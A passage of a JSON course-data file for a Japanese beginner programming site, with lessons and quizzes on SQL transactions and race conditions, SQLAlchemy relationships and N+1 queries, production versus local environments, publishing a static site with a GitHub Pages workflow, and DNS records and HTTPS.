`BEGIN; ... COMMIT;` | SQL で書くトランザクション。失敗したら `ROLLBACK;` |\n| `with Session(engine) as s, s.begin():`（SQLAlchemy） | 同じことを ORM で |\n\n⚠️ Python の `sqlite3` は、`commit()` を呼ぶまで変更が確定しません。AI のコードで、INSERT した後に `conn.commit()`（または `with conn:`）が無いと、**プログラムが終わったときに変更が消えます**。\n\n## 競合：読んでから書くと、ずれる\n\n「残り 1 個の商品を、2 人がほぼ同時に買う」場面を考えます。\n\n```python\n# ⚠️ 読んでから書く\nstock = conn.execute(\"SELECT stock FROM items WHERE id = 1\").fetchone()[0]   # 2 人とも 1 を読む\nif stock >= 1:\n    conn.execute(\"UPDATE items SET stock = ? WHERE id = 1\", (stock - 1,))    # 2 人とも 0 を書く\n    # → 2 人とも「買えた」ことになるが、在庫は 1 しか減っていない\n```\n\nコンピュータの基礎コースの「プロセスとスレッド」で見た **競合状態** と同じです。読んでから書くまでの間に、別の人が割り込みます。\n\n### 直し方：条件付きの UPDATE を 1 回で\n\n```python\ncur = conn.execute(\"UPDATE items SET stock = stock - 1 WHERE id = 1 AND stock >= 1\")\nif cur.rowcount == 0:\n    return {\"error\": \"売り切れました\"}, 409\n```\n\n```text\n1 人目：rowcount 1   ← 在庫を 1 減らせた\n2 人目：rowcount 0   ← 条件 stock >= 1 に合わなかったので、何も変わらなかった\n```\n\n「在庫があれば減らす」を **データベースへの 1 つの命令** にすると、データベースが順番に処理するので、割り込まれません。`rowcount`（変わった行の数）で、成功したかが分かります。\nもっと複雑な処理では、PostgreSQL の `SELECT ... FOR UPDATE`（読んだ行に鍵をかける）などを使います。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| 金額・在庫の列に `CHECK (... >= 0)` が無い | ⚠️ マイナスの残高・在庫が入りうる |\n| 複数の INSERT/UPDATE が、`with conn:` やトランザクションの外にバラバラにある | ⚠️ 途中で失敗すると、半分だけ変わった状態が残る |\n| `SELECT` で数を読み、Python で計算して `UPDATE ... SET stock = ?` | ⚠️ 競合でずれる。`SET stock = stock - 1 WHERE ... AND stock >= 1` に |\n| `SELECT` で重複を確認してから `INSERT` | ⚠️ 同時の登録で重複しうる。UNIQUE 制約＋`IntegrityError` の処理に |\n| `except Exception: pass` でデータベースのエラーを握りつぶす | ⚠️ 失敗に気づけない。rollback されたのかも分からない |\n| `conn.commit()` が無い | ⚠️ 変更が保存されない |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "送金処理で「B に +300」は成功し、「A から -300」が失敗した。トランザクションにしていた場合、どうなる？",
        "choices": [
         "B だけ 300 円増えた状態で確定する",
         "両方とも取り消され、送金前の状態に戻る",
         "A の残高がマイナスになる"
        ],
        "answer": 1,
        "explain": "トランザクションは「全部成功するか、全部なかったことになるか」です。途中で失敗したら、成功していた部分も rollback されます。"
       },
       {
        "question": "在庫を減らす処理として、2 人が同時に買っても安全なのは？",
        "choices": [
         "SELECT で在庫を読み、Python で 1 引いた値を UPDATE する",
         "`UPDATE items SET stock = stock - 1 WHERE id = ? AND stock >= 1` を 1 回実行し、rowcount を確認する",
         "SELECT を 2 回して、同じ値なら UPDATE する"
        ],
        "answer": 1,
        "explain": "読んでから書くと、その間に割り込まれます。条件付きの UPDATE 1 回なら、データベースが順番に処理するので安全です。"
       },
       {
        "question": "アプリでバリデーションしているのに、データベースにも CHECK や UNIQUE を付ける理由は？",
        "choices": [
         "付けないと SQL が動かないから",
         "アプリのバリデーションが不要になるから",
         "バグ・別のプログラム・同時アクセスなど、アプリのチェックをすり抜ける場合でもデータを守れるから"
        ],
        "answer": 2,
        "explain": "データベースの制約は最後の砦です。アプリのチェックと両方あると、より確実です。"
       }
      ]
     ],
     "id": "05-constraints-transactions"
    },
    {
     "title": "ORM でテーブルの関係を読む ― relationship と N+1",
     "level": 4,
     "minutes": 20,
     "concepts": [
      "database",
      "classes",
      "performance"
     ],
     "summary": "SQLAlchemy の ForeignKey・relationship・back_populates が、外部キーと 1 対多をどう表しているか。user.posts の裏で走る SQL と、N+1 を selectinload で直す方法。Prisma との対応も。",
     "body": "## このレッスンのゴール\n\n- ORM のモデル定義を読んで、テーブルと関係（1 対多・多対多）を図にできる\n- `user.posts` のような書き方の裏で、いつ SQL が実行されるか説明できる\n- N+1 問題を見つけ、`selectinload` などで直す方法が分かる\n\nバックエンドコースのレッスン 8（ORM とマイグレーション）の続きで、**テーブルどうしの関係** に注目します。\n\n## モデルを読む\n\n```python\nfrom sqlalchemy import ForeignKey, String\nfrom sqlalchemy.orm import DeclarativeBase, Mapped, mapped_column, relationship\n\nclass Base(DeclarativeBase):\n    pass\n\nclass User(Base):\n    __tablename__ = \"users\"\n    id: Mapped[int] = mapped_column(primary_key=True)\n    name: Mapped[str] = mapped_column(String(50))\n    posts: Mapped[list[\"Post\"]] = relationship(back_populates=\"author\", cascade=\"all, delete-orphan\")\n\nclass Post(Base):\n    __tablename__ = \"posts\"\n    id: Mapped[int] = mapped_column(primary_key=True)\n    title: Mapped[str] = mapped_column(String(200))\n    user_id: Mapped[int] = mapped_column(ForeignKey(\"users.id\"))\n    author: Mapped[\"User\"] = relationship(back_populates=\"posts\")\n```\n\n| コード | テーブルでの意味 |\n|---|---|\n| `__tablename__ = \"posts\"` | テーブル名 |\n| `mapped_column(primary_key=True)` | 主キー（レッスン 1） |\n| `ForeignKey(\"users.id\")` | **外部キー**。`posts.user_id` は `users.id` を指す（レッスン 2） |\n| `relationship(...)` | **テーブルの列ではない**。Python から相手をたどるための通り道 |\n| `Mapped[list[\"Post\"]]` | 相手が **たくさん**（1 対多の「1」の側） |\n| `Mapped[\"User\"]` | 相手が **1 つ**（1 対多の「多」の側） |\n| `back_populates=\"author\"` | 反対側の relationship の名前。`post.author` と `user.posts` がつながる |\n| `cascade=\"all, delete-orphan\"` | ユーザーを消したら投稿も消す（Python 側の `ON DELETE CASCADE`） |\n\n図にすると、レッスン 2 と同じ形です。\n\n```text\nUser (users)            Post (posts)\nid                 ←──  user_id   （ForeignKey：実際の列）\nposts ─────────────────→ author   （relationship：たどる道。列ではない）\n```\n\n**外部キーの列（`user_id`）は「多」の側にだけある** こと、**relationship は両側にある** ことが読み取れれば OK です。\n\n## 関係をたどる\n\n```python\nfrom sqlalchemy import select\nfrom sqlalchemy.orm import Session\n\nwith Session(engine) as s:\n    p = s.get(Post, 1)\n    print(p.title, \"by\", p.author.name)          # post1-0 by user1\n\n    posts = s.scalars(\n        select(Post).join(Post.author).where(User.name == \"user2\")\n    ).all()                                      # user2 の投稿\n```\n\n`p.author` と書くだけで、裏で `SELECT ... FROM users WHERE users.id = ?` が実行されます。SQL を書かなくてよいのが ORM の便利なところですが、**いつ SQL が走っているか見えにくい** のが弱点です。\n\n## N+1：知らないうちに SQL が大量に\n\nユーザー 5 人（それぞれ投稿 3 件）で試しました。実行された SQL の数を数えています。\n\n```python\nwith Session(engine) as s:\n    for u in s.scalars(select(User)):       # ① ユーザー一覧：SQL 1 回\n        print(u.name, len(u.posts))         # ② 1 人ごとに投稿を取る：SQL 1 回 × 5 人\n# 実行された SQL：6 回\n```\n\n`u.posts` に **初めて触ったときに** 、その人の投稿を取る SQL が走ります（**遅延読み込み**、lazy loading）。\nユーザーが 1000 人なら 1001 回。これが **N+1 問題**（1 回 ＋ N 人分）です。バックエンドコースのレッスン 14 で、速さの問題の代表として見ました。\n\n### 直し方：最初にまとめて取る\n\n```python\nfrom sqlalchemy.orm import selectinload\n\nwith Session(engine) as s:\n    for u in s.scalars(select(User).options(selectinload(User.posts))):\n        len(u.posts)\n# 実行された SQL：2 回（ユーザー一覧 1 回 ＋ 全員の投稿をまとめて 1 回）\n```\n\n| 書き方 | SQL | 向いている場面 |\n|---|---|---|\n| 何も指定しない（遅延読み込み） | 1 ＋ N 回 | 相手をたまにしか使わない |\n| `selectinload(User.posts)` | 2 回（`WHERE user_id IN (1, 2, …)`） | 1 対多の「たくさん」の側を取る（定番） |\n| `joinedload(Post.author)` | 1 回（JOIN） | 1 対多の「1」の側を取る |\n\n（SQLAlchemy 2.1 で、実行した SQL の数を数えて確認しました）\n\nSQL を見たいときは、`create_engine(..., echo=True)` にすると、実行されたすべての SQL が画面に出ます。**「ループの中で relationship に触っていないか」** を探すのが、N+1 を見つけるコツです。\n\n## 多対多の書き方\n\n```python\nfrom sqlalchemy import Column, Table\n\npost_tags = Table(                                   # 中間テーブル（レッスン 2）\n    \"post_tags\", Base.metadata,\n    Column(\"post_id\", ForeignKey(\"posts.id\"), primary_key=True),\n    Column(\"tag_id\", ForeignKey(\"tags.id\"), primary_key=True),\n)\n\nclass Tag(Base):\n    __tablename__ = \"tags\"\n    id: Mapped[int] = mapped_column(primary_key=True)\n    name: Mapped[str] = mapped_column(unique=True)\n    posts: Mapped[list[\"Post\"]] = relationship(secondary=post_tags, back_populates=\"tags\")\n\n# Post の側にも：\n#   tags: Mapped[list[\"Tag\"]] = relationship(secondary=post_tags, back_populates=\"posts\")\n```\n\n`secondary=post_tags` が「中間テーブルを通ってつながる」という意味です。`post.tags.append(tag)` と書くと、ORM が `post_tags` に行を足してくれます。\n\n## 他の ORM では\n\nJavaScript / TypeScript でよく使われる **Prisma** では、同じ関係をこう書きます。\n\n```prisma\nmodel User {\n  id    Int    @id @default(autoincrement())\n  name  String\n  posts Post[]                                  // relationship（たくさん）\n}\n\nmodel Post {\n  id     Int    @id @default(autoincrement())\n  title  String\n  userId Int                                    // 外部キーの列\n  author User   @relation(fields: [userId], references: [id])   // relationship（1 つ）\n}\n```\n\n```typescript\nconst users = await prisma.user.findMany({ include: { posts: true } });   // まとめて取る（N+1 を防ぐ）\n```\n\n| | SQLAlchemy（Python） | Prisma（TypeScript） | Django（Python） |\n|---|---|---|---|\n| 外部キー | `ForeignKey(\"users.id\")` | `@relation(fields: [userId], ...)` | `models.ForeignKey(User, ...)` |\n| たくさんの側 | `Mapped[list[\"Post\"]]` | `Post[]` | `user.post_set`（自動で作られる） |\n| まとめて取る | `selectinload` / `joinedload` | `include` | `prefetch_related` / `select_related` |\n\n書き方は違いますが、**外部キーの列・たどる道・まとめて取る指定** の 3 つを探せば、どの ORM でも同じように読めます。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `for x in ...:` の中で `x.posts`・`x.author` に触っている | ⚠️ N+1。`selectinload` / `joinedload` / `include` があるか |\n| `relationship` はあるが `ForeignKey` が無い | ⚠️ ORM がどの列でつなぐか分からずエラーになる |\n| `back_populates` の名前が反対側と合っていない | ⚠️ 起動時にエラー。両側の名前を確認 |\n| `cascade=\"all, delete-orphan\"` | 親を消すと子も消える。本当にそれでよいか（レッスン 2 の ON DELETE と同じ判断） |\n| API で一覧を返すときに、関係するデータも全部入れて返す | ⚠️ データが多いと遅く重くなる。必要な分だけ・ページ分けを |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "SQLAlchemy の `relationship(...)` について正しいのは？",
        "choices": [
         "テーブルに新しい列を作る",
         "列ではなく、Python から相手のオブジェクトをたどるための通り道",
         "外部キーの代わりなので、ForeignKey は不要になる"
        ],
        "answer": 1,
        "explain": "実際の列は `ForeignKey` を付けた `user_id` だけです。relationship は、`user.posts` のようにたどるための仕組みです。"
       },
       {
        "question": "ユーザー 100 人の一覧を表示し、ループの中で `len(u.posts)` を表示した。遅延読み込みのままだと、SQL は何回くらい実行される？",
        "choices": [
         "1 回",
         "2 回",
         "101 回"
        ],
        "answer": 2,
        "explain": "一覧の 1 回に加えて、1 人ごとに投稿を取る SQL が 100 回走ります。これが N+1 問題です。"
       },
       {
        "question": "上の N+1 を直す方法として適切なのは？",
        "choices": [
         "`select(User).options(selectinload(User.posts))` で、投稿をまとめて取っておく",
         "ループを `while` に書き換える",
         "`len()` の代わりに `count()` を使う"
        ],
        "answer": 0,
        "explain": "selectinload を指定すると、全員の投稿を 1 回の SQL（`WHERE user_id IN (...)`）でまとめて取るので、合計 2 回で済みます。"
       }
      ]
     ],
     "id": "06-orm-relations"
    }
   ],
   "status": "open"
  },
  {
   "title": "公開とクラウド",
   "icon": "☁️",
   "order": 150,
   "category": "topic",
   "description": "作ったものをインターネットに公開して、動かし続ける仕組み。ローカルと本番、静的サイトの公開（このサイトの GitHub Pages）、ドメイン・DNS・HTTPS、設定と環境変数、ホスティングの選び方、Docker、GitHub Actions、本番で困ったときの対応まで。",
   "levels": {
    "1": "入門：公開するとは",
    "2": "基礎：つながる仕組みと選び方",
    "3": "実践：箱と自動化",
    "4": "応用：動かし続ける"
   },
   "id": "150-deploy-cloud",
   "lessons": [
    {
     "title": "ローカルと本番 ― 「私のパソコンでは動いた」の正体",
     "level": 1,
     "minutes": 14,
     "concepts": [
      "deploy",
      "tooling"
     ],
     "summary": "開発環境・ステージング・本番の 3 つの環境と、そのあいだで変わるもの。「手元で動いたのに本番で動かない」よくある原因の一覧。",
     "body": "## このレッスンのゴール\n\n- 開発環境・ステージング・本番環境の役割を説明できる\n- 環境のあいだで「変わるもの」「変えてはいけないもの」が分かる\n- 「手元では動いたのに本番で動かない」ときに、疑う場所の見当がつく\n\n## 3 つの環境\n\n| 環境 | 英語 | どこ | 誰が使う | データ |\n|---|---|---|---|---|\n| **開発環境** | development / local | 自分のパソコン | 自分 | 試し用。消えてもよい |\n| **ステージング** | staging | 本番そっくりのサーバー | 開発者・確認する人 | 本番に似せた試し用 |\n| **本番環境** | production | 公開しているサーバー | **利用者全員** | **本物**。消えたら大変 |\n\n個人の小さなアプリでは、ステージングを省いて「開発 → 本番」の 2 つで進めることも多いです。プルリクエストごとに一時的な確認用の環境を自動で作ってくれるサービス（**プレビュー環境**）もあります（レッスン 5）。\n\n## 環境のあいだで変わるもの\n\nバックエンドコースのレッスン 15 の表を、もう少し細かく見ます。\n\n| | 開発 | 本番 |\n|---|---|---|\n| URL | `http://localhost:8000` | `https://example.com` |\n| 通信 | http（暗号化なし） | **https**（レッスン 3） |\n| データベース | SQLite のファイル・手元の PostgreSQL | クラウドのデータベース |\n| 秘密情報 | `.env` ファイル | クラウドのシークレット管理（レッスン 4） |\n| エラーの表示 | 詳しく（どの行で落ちたか） | 利用者には「エラーが起きました」だけ。詳細はログへ（レッスン 8） |\n| 自動再起動 | `--reload`（ファイルを保存すると再起動） | 付けない |\n| OS | Windows・Mac | **Linux** がほとんど |\n| 同時に使う人 | 1 人 | たくさん |\n\n**変えてよいのは「設定」だけ、コードは同じ** にするのが基本です。「本番ならこうする」という `if` をコードのあちこちに書くと、本番でしか起きないバグの元になります。設定は環境変数で切り替えます（レッスン 4）。\n\n## 「手元では動いたのに」よくある原因\n\n| 原因 | 例 | 対策 |\n|---|---|---|\n| **OS の違い** | Windows では `Data.csv` と `data.csv` が同じだが、Linux では別（ターミナルと Git のコースのレッスン 1） | ファイル名の大文字・小文字をそろえる |\n| **バージョンの違い** | 手元は Python 3.13、本番は 3.11 | バージョンを固定（`.python-version`、Docker のレッスン 6） |\n| **ライブラリの入れ忘れ** | 手元では入っているが、`requirements.txt` に書いていない | `pip freeze` / ロックファイル（セキュリティのコースのレッスン 6） |\n| **環境変数の設定忘れ** | `.env` は Git に入れないので、本番には無い | 本番の設定画面で登録する。起動時に足りないものがあれば止まるようにする（レッスン 4） |\n| **ファイルの保存先** | アップロードした画像をサーバーのフォルダに保存したら、再起動で消えた | 多くのクラウドは再起動でファイルが消える。ファイルは保存用のサービス（S3・R2 など）に |\n| **localhost を直接書いている** | フロントエンドのコードに `http://localhost:8000/api` | API の URL も設定にする |\n| **文字コード** | Windows で作った CSV が本番で化ける（コンピュータの基礎コースのレッスン 5） | `encoding=\"utf-8\"` を明示 |\n| **時刻** | 手元は日本時間、本番のサーバーは UTC（世界標準時） | 保存は UTC、表示のときに日本時間に |\n\n## 本番のデータを守る\n\n本番環境で一番大事なのは **利用者のデータ** です。\n\n- 開発中のコードを、**本番のデータベースにつないで試さない**\n- 本番のデータを手元にコピーするときは、個人情報に注意する\n- テーブルの変更（マイグレーション）は、手元とステージングで試してから\n- **バックアップ** を取り、戻せることを確かめておく（レッスン 8）\n\nCloudflare D1 の `--local`（手元）と `--remote`（本番）の違い（バックエンドコースのレッスン 19）も、この話です。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `app.run(debug=True)`（Flask）／ `DEBUG = True`（Django） | ⚠️ 本番では必ずオフ。エラーの画面にコードや設定が出てしまう |\n| `uvicorn main:app --reload` を本番の起動コマンドに | ⚠️ 開発用 |\n| `fetch(\"http://localhost:8000/...\")` | ⚠️ 本番では届かない。設定にする |\n| `if os.environ.get(\"ENV\") == \"production\":` があちこちに | ⚠️ 本番でしか通らない道ができる。設定の値で動きを変える形に |\n| アップロードを `open(f\"uploads/{name}\", \"wb\")` で保存 | ⚠️ クラウドでは再起動で消えることが多い |\n| `datetime.now()` で保存 | サーバーの時刻帯に依存。`datetime.now(timezone.utc)` で保存すると安全 |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "「本番環境」についての説明として正しいのは？",
        "choices": [
         "開発者が新しい機能を自由に試す場所",
         "利用者が実際に使っている環境で、データも本物",
         "自分のパソコンの中の環境"
        ],
        "answer": 1,
        "explain": "本番のデータは利用者のものです。試すのは開発環境やステージングで行います。"
       },
       {
        "question": "手元の Windows では動いたのに、本番の Linux サーバーで `No such file or directory: 'Data.csv'` になった。考えられる原因は？",
        "choices": [
         "実際のファイル名が `data.csv` で、Linux は大文字・小文字を区別するから",
         "Linux では CSV が読めないから",
         "本番のサーバーが壊れているから"
        ],
        "answer": 0,
        "explain": "Windows は大文字・小文字を区別しませんが、Linux は区別します。ファイル名を正確にそろえます。"
       },
       {
        "question": "開発と本番で違うべきものは、どこで切り替えるのがよい？",
        "choices": [
         "コードの中の `if` 文",
         "環境変数などの設定",
         "本番用に別のリポジトリを作る"
        ],
        "answer": 1,
        "explain": "コードは同じにして、違いは設定（環境変数）だけにするのが基本です。本番でしか通らないコードを作らないためです。"
       }
      ]
     ],
     "id": "01-local-vs-production"
    },
    {
     "title": "静的サイトの公開 ― このサイトを GitHub Pages に出すまで",
     "level": 1,
     "minutes": 16,
     "concepts": [
      "deploy",
      "http_api",
      "tooling"
     ],
     "summary": "サーバーで処理しない「静的サイト」と、処理する「動的サイト」の違い。このサイトの pages.yml を 1 行ずつ読み、GitHub Pages で公開する流れと、静的サイトでできないこと・してはいけないことを知る。",
     "body": "## このレッスンのゴール\n\n- 静的サイトと動的サイトの違いを説明できる\n- このリポジトリの `.github/workflows/pages.yml` を読んで、公開までの流れを説明できる\n- 静的サイトに置いてはいけないもの（秘密情報）と、できないことが分かる\n\n## 静的と動的\n\n| | 静的サイト | 動的サイト |\n|---|---|---|\n| サーバーがすること | **置いてあるファイルを、そのまま返す** だけ | リクエストごとにプログラムを動かして、答えを作る |\n| 中身 | HTML・CSS・JavaScript・画像 | ＋ Python・Node.js などのサーバーのプログラム、データベース |\n| 例 | このサイト、会社の紹介ページ、ブログ、ドキュメント | ログインのあるサービス、掲示板、ネットショップ |\n| 公開先の例 | GitHub Pages、Cloudflare Pages、Netlify、Vercel | Render、Cloud Run、Cloudflare Workers など（レッスン 5） |\n| 費用・手間 | 無料のことが多い。ほぼ手間なし | 小さければ無料枠もあるが、管理が増える |\n\n「静的」といっても、**JavaScript でブラウザの中で動くものは作れます**。このサイトも、クイズの採点や検索はブラウザの JavaScript（`site/app.js`）が行い、進み具合はブラウザの localStorage に保存しています。サーバーは何も計算していません。\n\n## このサイトの作り\n\n```text\ncontent/（Markdown）──→ python tools/build.py ──→ site/data.js\n                                                   site/index.html\n                                                   site/app.js        ← これを置けば完成\n                                                   site/style.css\n```\n\n`tools/build.py` が Markdown をまとめて `site/data.js` を作るので、`site/` フォルダの中身を置くだけで動きます。この「事前に作っておく」作業を **ビルド** と呼びます。React などのフレームワークでも `npm run build` で `dist/` などにファイルを作り、それを公開します。\n\n## pages.yml を読む\n\nこのリポジトリには、GitHub Pages に公開するための設定が入っていて、実際に `https://ryo0000200001-coder.github.io/learn_programing/` で公開されています。\n\n```yaml\nname: Deploy site\n\non:                         # ① いつ動くか（きっかけ）\n  push:\n    branches: [main]        #    main に push されたとき\n  workflow_run:             #    別のワークフロー（自動マージ）が終わったとき\n    workflows: [\"Auto merge Claude branches into main\"]\n    types: [completed]\n  workflow_dispatch:        #    手動で「実行」ボタンを押したとき\n\npermissions:                # ② この作業に与える権限（最小権限）\n  contents: read            #    リポジトリは読むだけ\n  pages: write              #    Pages への公開はしてよい\n  id-token: write           #    GitHub に「本当にこのリポジトリの作業か」を証明する\n\nconcurrency:                # ③ 同時に 2 つ走ったら、古い方を止める\n  group: pages\n  cancel-in-progress: true\n\njobs:\n  deploy:\n    # 自動マージが失敗したときは公開しない\n    if: github.event_name != 'workflow_run' || github.event.workflow_run.conclusion == 'success'\n    runs-on: ubuntu-latest  # ④ GitHub が用意する Linux のパソコンで動かす\n    environment:\n      name: github-pages\n      url: ${{ steps.deployment.outputs.page_url }}\n    steps:\n      - uses: actions/checkout@v4              # ⑤ リポジトリの中身（main）を取ってくる\n        with:\n          ref: main\n      - uses: actions/setup-python@v5          # ⑥ Python 3.12 を用意\n        with:\n          python-version: \"3.12\"\n      - run: python tools/build.py             # ⑦ site/data.js を作る（ビルド）\n      - uses: actions/configure-pages@v5       # ⑧ Pages の設定を読む\n      - uses: actions/upload-pages-artifact@v3 # ⑨ site フォルダを固めてアップロード\n        with:\n          path: site\n      - id: deployment\n        uses: actions/deploy-pages@v4          # ⑩ 公開する\n```\n\n| 番号 | 読み方 |\n|---|---|\n| ① | `on:` は「きっかけ」。3 つ書かれていて、どれか 1 つが起きれば動く。`workflow_run` があるのは、**GitHub Actions 自身が main に push したときは `push` のきっかけが起きない** という決まりがあるため。Claude のブランチを自動マージ（レッスン 7）した後は、こちらで拾っている |\n| `if:` | 自動マージが失敗した（コンフリクトなど）ときは、公開しない |\n| ② | `permissions:` で、この作業ができることを最小限にしている（セキュリティのコースのレッスン 1） |\n| ④〜⑩ | 毎回、まっさらな Linux のパソコンを借りて、取ってくる → Python を入れる → ビルド → アップロード → 公開、を順番に行う |\n| `uses:` | 他の人が作った部品（アクション）を使う。`@v4` はバージョン |\n| `run:` | コマンドをそのまま実行 |\n\nGitHub Actions の書き方は、レッスン 7 でくわしく読みます。\n\n### 公開する手順\n\n自分の別のリポジトリで同じことをするなら、次の手順です。\n\n1. GitHub のリポジトリの **Settings → Pages → Build and deployment → Source** を **GitHub Actions** にする\n2. 上のようなワークフローを `.github/workflows/` に置いて、main に push する（または **Actions** タブ → 「Deploy site」→ **Run workflow**）\n3. 数分後に `https://ユーザー名.github.io/リポジトリ名/` で見られる\n\nこのサイトでは、Claude がレッスンを push する → 自動マージ → 自動で公開、までがつながっているので、スマホからも数分後には新しいレッスンが見られます。\n\n⚠️ 公開すると、**URL を知っている人は誰でも見られます**。非公開のリポジトリで Pages を使うには有料プランが必要な場合があり、有料でも「サイト自体を非公開にする」機能は一部のプランだけです。見られて困るものは置かない、が原則です。\n\n## 静的サイトに置いてはいけないもの\n\n静的サイトのファイルは、**全部そのまま利用者のブラウザに送られます**。ブラウザの「ページのソースを表示」や開発者ツールで、誰でも中身を見られます。\n\n| ⚠️ 置いてはいけない | 理由 |\n|---|---|\n| API キー・パスワード・トークン | JavaScript の中に書いても丸見え（AI と開発するコースの「ブラウザで動くコードに注意」） |\n| 個人情報の入ったデータ | `data.js` や JSON も丸見え |\n| 「隠しページ」 | URL を知られたら見られる（セキュリティのコースのレッスン 1） |\n\n秘密が必要な処理（外部の API を呼ぶ、データベースに保存する）は、**サーバー側**（Cloudflare Workers などのサーバーレス関数）に置いて、静的サイトからはそこを呼ぶようにします。\n\n## 静的サイトでできないこと\n\n| やりたいこと | 静的サイトだけでは | 足すもの |\n|---|---|---|\n| 利用者どうしでデータを共有（掲示板・予約） | できない（localStorage はその人のブラウザだけ） | データベース＋API（Firebase・Supabase・Workers＋D1） |\n| ログイン | できない | 認証サービス（バックエンドコースのレッスン 18 の OAuth など） |\n| お問い合わせフォームのメール送信 | できない | フォーム送信サービス、またはサーバーレス関数 |\n| 秘密の API キーを使う | できない | サーバーレス関数 |\n\n**まず静的サイトで作れないか考える** のが、安く・安全に公開するコツです。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "このサイト（Code Reading Dojo）が「静的サイト」と言える理由は？",
        "choices": [
         "JavaScript を使っていないから",
         "サーバーはファイルを返すだけで、クイズの採点なども利用者のブラウザで動いているから",
         "内容が一度も変わらないから"
        ],
        "answer": 1,
        "explain": "静的サイトでも JavaScript は動きます。サーバーがリクエストごとにプログラムを動かさない、という意味です。"
       },
       {
        "question": "`pages.yml` の `run: python tools/build.py` は何をしている？",
        "choices": [
         "サイトを公開している",
         "Markdown から `site/data.js` を作るビルドをしている",
         "Python をインストールしている"
        ],
        "answer": 1,
        "explain": "公開の前に、Markdown をまとめて site/data.js を作っています。Python の用意はその前の `setup-python`、公開は最後の `deploy-pages` です。"
       },
       {
        "question": "静的サイトの JavaScript に、外部サービスの API キーを書いた。何が問題？",
        "choices": [
         "問題ない。JavaScript はブラウザで実行されるだけで、中身は見えない",
         "ファイルはそのまま利用者に送られるので、誰でもキーを見て使えてしまう",
         "サイトの表示が遅くなる"
        ],
        "answer": 1,
        "explain": "ブラウザに届くものはすべて見られます。秘密が必要な処理は、サーバー側の関数に置きます。"
       }
      ]
     ],
     "id": "02-static-hosting"
    },
    {
     "title": "ドメイン・DNS・HTTPS ― 自分の住所を持つ",
     "level": 2,
     "minutes": 18,
     "concepts": [
      "deploy",
      "http_api",
      "security"
     ],
     "summary": "独自ドメインを取って公開したサービスにつなぐまで。DNS のレコード（A・CNAME・TXT・MX）、TTL、HTTPS の証明書と Let's Encrypt、よくあるつまずき。",
     "body": "## このレッスンのゴール\n\n- ドメインを買ってから、サイトが表示されるまでの流れを説明できる\n- DNS のレコード（A・AAAA・CNAME・TXT・MX）が何を表しているか読める\n- HTTPS の証明書の役割と、「証明書のエラー」の意味が分かる\n\nバックエンドコースのレッスン 2 で「DNS は名前から住所（IP アドレス）を引く電話帳」と学びました。ここでは、**自分のドメインを電話帳に載せる側** に回ります。\n\n## ドメインを持つとは\n\n`ユーザー名.github.io` のような URL でも公開できますが、自分の名前の住所（`example.com`）を使いたいときは **ドメイン** を買います（年に数百円〜数千円）。\n\n| 用語 | 意味 | 例 |\n|---|---|---|\n| **ドメイン** | インターネット上の名前 | `example.com` |\n| **サブドメイン** | ドメインの前に付ける名前。自由に作れる | `www.example.com`、`api.example.com` |\n| **レジストラ** | ドメインを売っている会社 | Cloudflare Registrar、お名前.com、Squarespace（旧 Google Domains）など |\n| **DNS サーバー** | そのドメインの「電話帳」を持っている場所 | 多くはレジストラや Cloudflare が用意 |\n\n## DNS のレコード\n\n電話帳の 1 行 1 行を **レコード** と呼びます。管理画面で、こんな表を作ります。\n\n| 種類 | 名前 | 値 | 意味 |\n|---|---|---|---|\n| **A** | `example.com` | `203.0.113.10` | この名前の住所は、この **IPv4 アドレス** |\n| **AAAA** | `example.com` | `2001:db8::10` | 同じく **IPv6 アドレス**（新しい形式の住所） |\n| **CNAME** | `www` | `ユーザー名.github.io` | この名前は、**別の名前の別名**。住所はそっちで引いて |\n| **TXT** | `example.com` | `google-site-verification=...` | 自由な文字。「このドメインの持ち主です」の証明やメールの設定に使う |\n| **MX** | `example.com` | `mail.example.com` | このドメイン宛ての **メール** の受け取り先 |\n\n（`203.0.113.10` や `2001:db8::` は、説明用に予約されている住所です）\n\n試しに、この環境から `github.com` の住所を引くと、`140.82.113.3` でした（引くたびに変わることがあります）。\n\n### A と CNAME の使い分け\n\n| 公開先 | 設定するもの |\n|---|---|\n| 自分で借りたサーバー（IP アドレスが決まっている） | **A**（と AAAA） |\n| GitHub Pages・Vercel・Render などのサービス | 多くは **CNAME**（サービスの名前に向ける）。サービス側が住所を変えても、自分は何もしなくてよい |\n\n⚠️ ドメインそのもの（`example.com`、「ルートドメイン」「Apex」と呼ぶ）には、普通は CNAME を置けません。サービスの説明に従って A レコードを使うか、Cloudflare の「CNAME フラット化」のような機能を使います。\n\n### サービスとつなぐ流れ（GitHub Pages の例）\n\n1. DNS で `www` の CNAME を `ユーザー名.github.io` にする\n2. GitHub のリポジトリの Settings → Pages → **Custom domain** に `www.example.com` を入れる\n3. GitHub が DNS を確認し、HTTPS の証明書を自動で用意する\n4. 「Enforce HTTPS」にチェック\n\nサービス側（GitHub）にも「このドメインを使う」と登録する、**両側の設定が必要** なのがポイントです。\n\n## TTL：書き換えがすぐ反映されない理由\n\n各レコードには **TTL**（Time To Live、覚えておいてよい秒数）が付いています。\n\n```text\nwww.example.com   CNAME   ユーザー名.github.io   TTL 3600（1 時間）\n```\n\n世界中の DNS サーバーやパソコンは、一度引いた答えを TTL の間 **覚えておき（キャッシュ）**、その間は聞き直しません。だから、レコードを書き換えても、**最大で TTL の時間、古い住所に行く人がいます**。\n\n- 「DNS を変えたのに表示されない」→ まず少し待つ（数分〜数時間）\n- 引っ越しの予定があるなら、前もって TTL を短く（300 秒など）しておく\n\n## HTTPS と証明書\n\nHTTPS（バックエンドコースのレッスン 2）は、通信を暗号化するだけでなく、**「本当に example.com のサーバーと話しているか」を確かめる** 仕組みでもあります。そのための身分証明書が **SSL/TLS 証明書** です。\n\n| 証明書に書いてあること | 意味 |\n|---|---|\n| 対象のドメイン | `example.com`、`www.example.com` |\n| 発行者（認証局） | 信頼できる会社や団体（Let's Encrypt など） |\n| 有効期限 | この日まで有効 